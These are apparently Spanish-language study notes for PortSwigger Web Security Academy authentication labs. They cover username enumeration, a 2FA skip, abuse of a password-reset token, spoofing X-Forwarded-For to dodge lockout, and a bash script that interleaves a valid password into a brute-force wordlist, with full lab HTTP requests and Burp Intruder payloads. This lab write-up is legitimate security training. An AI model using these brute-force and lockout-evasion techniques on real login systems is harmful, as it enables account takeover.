# Username enumeration via different responses

Para resolver este laboratorio fue basicamente usando el intruder y viendo las respuestas 
diferentes nada que no se hiciera antes ( por eso no pongo nada)
Primero por el user y luego con el password.

# 2FA simple bypass

Para este laboratorio primero entro a la cuenta de wiener pones el codigo de 2FA y te das cuenta cual es la url a la que redirecciona
Despues entras con el usuario carlos te pide el 2FA y pones la redireccion y bypaseas la dirección.

```
https://0ac0005004569ddec0d9b598000300f9.web-security-academy.net/my-account

```
# Password reset broken logic

Para este laboratorio los pasos son con la cuenta de wiener probar como se cambian los passwords nos damos cuenta
que se genera una peticion post

```

POST /forgot-password?temp-forgot-password-token= HTTP/1.1
Host: 0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net
Cookie: session=mHQvAUXSlvYVoQhyaakHp9dEPz0azo43
Content-Length: 85
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4500e903bb9d82c0c354c5004200a9.web-security-academy.net/forgot-password?temp-forgot-password-token=LLovPAZYOGV6wJ30Uw7rcfMC7IHTCeif
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close

temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter

```

Y que se genera un token que se replica abajo y arriba si se borra dicho token aun si se borra genera un cambio de password como en el ejemplo de arriba
ahora solo cambias el username por carlos y listo pudiste cambiar el password de la cuenta de carlos.


# Username enumeration via subtly different responses

Para este lab usamos el intruder basicamente es un ataque de fuerza bruta pero nos damos cuenta que el string de "Ivalid username or password" 
cambia un poco para el usuario "af" lo pone sin punto se hace usao de las Opciones y del Grep Extract para ver exactamente que cambia se encuentra 
el usuario "af" y ahora atacas el password y ya sirve.


# Username enumeration via response timing

Para este laboratorio se introduce un concepto nuevo una header:

## X-Forwarded-For 

> La cabecera X-Forwarded-For (XFF) es un estándar de facto para identificar el origen de la dirección IP de un cliente conectado a un servidor web a través de un proxy HTTP o un balanceador de carga. Cuando se intercepta el tráfico entre cliente y servidores, los registros de los servidores de acceso contienen sólo la dirección IP del proxy o del balanceador de carga. Para ver la dirección IP original del cliente, se utiliza la cabecera X-Forwarded-For.

Sintaxis 

```

X-Forwarded-For: <client>, <proxy1>, <proxy2>

```
Como una idea mia quiza se podria extraer informacion de las direccione IPS de proxis que pasa la peticion ya que se van acomulando.

> Si una solicitud pasa por varios proxies, las direcciones IP de cada proxy se listan en forma sucesiva. Esto significa que la IP de más a la derecha es la IP del proxy más reciente, y la IP de más a la izquierda es la IP del cliente originador.

 > https://developer.mozilla.org/es/docs/Web/HTTP/Headers/X-Forwarded-For

Para resolver el laboratorio primero necesitamos fijarnos en la peticion POST `si atacamos directamente nos bloquea

```
POST /login HTTP/1.1
Host: 0a32003104cd1602c0b436c4005c003f.web-security-academy.net
Cookie: session=iC5jPtZJzxPKqcBSsUnoZuP1l1Cy1tR4
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a32003104cd1602c0b436c4005c003f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a32003104cd1602c0b436c4005c003f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close
X-Forwarded-For: 501

username=wiener&password=peter

```

Agregamos la header X-Forwarded-For esta nos permite evadir las protecciones y realizar el ataque Algunas cosas importantes
te das cuenta 1 que si pones esa cabecera y vas cambiando no te bloquea y 2 que si pones el usuario valido
wiener y pones un password muy largo si el usuario es valido tarda en responder mas aunque el pass sea incorrecto
( quiza porque si checa en una base de datos) 

Para el paso final nos dirigimos al intruder ahora seleccionamos primero que queremos que el intruder itere sobre 2 payloads 
para lo cual usamos un ataque diferente al sniper el ***Pitchfork*** es importante reconocer que se pudieron iterar sobre 2 valores como se ve acontinuacion

```
POST /login HTTP/1.1
Host: 0a32003104cd1602c0b436c4005c003f.web-security-academy.net
Cookie: session=iC5jPtZJzxPKqcBSsUnoZuP1l1Cy1tR4
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a32003104cd1602c0b436c4005c003f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a32003104cd1602c0b436c4005c003f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Connection: close
X-Forwarded-For: §501§

username=amarillo&password=§peter§
```

Activamos en columnas que nos muestre que peticion se tardo mas nos muestra que un usuario "amarillo" se tardo mas que todas por lo tanto
ya tenemos un usario para atacar ahora con un password finalmente atacacamos y nos da "dallas"( valores que cambian cada que uno levanta el lab al parecer)

# Burp Suite Pitchfork attack type

Este ataque consiste en que se tienen 2 listas y  estas se van a convinar de la siguiente manera

1. Username1:Password1
2. Username2:Password2
3. Username3:Password3
4. Username4:Password4

NO es como que pruebe cada uno de los passwords para cada uno de los usuarios NO


# Broken brute-force protection, IP block

Para este laboratorio nos dirigimos al login y nos percatamos que nos bloquea al tercer intento pero si el tercer intento metemos 
unas credenciales validas nos permite continuar entonces creamos una lista con los passwords sugeridos en este lab

```bash
#!/bin/bash


i=0

for j in $(cat lista.txt); do 


if [ $i -eq 1 ]
	then
	echo "peter" >> lista2.txt
	i=0
fi

i=$((i+1))

echo $j  >> lista2.txt

done

```

Despues creamos una lista de usuarios de modo que weiner y carlos queden en ese orden ya que vamos a usar el ataque PitchFork

Este tipo de ataque funciona asi 
```
User1:Password1
User2:Password2

```
Y como vimos cuando el usuario es correcto nos regresa un codigo 302 y cuando no un 200 entonces filtramos por el 302 y enocntramos el 
password del usuario carlos.



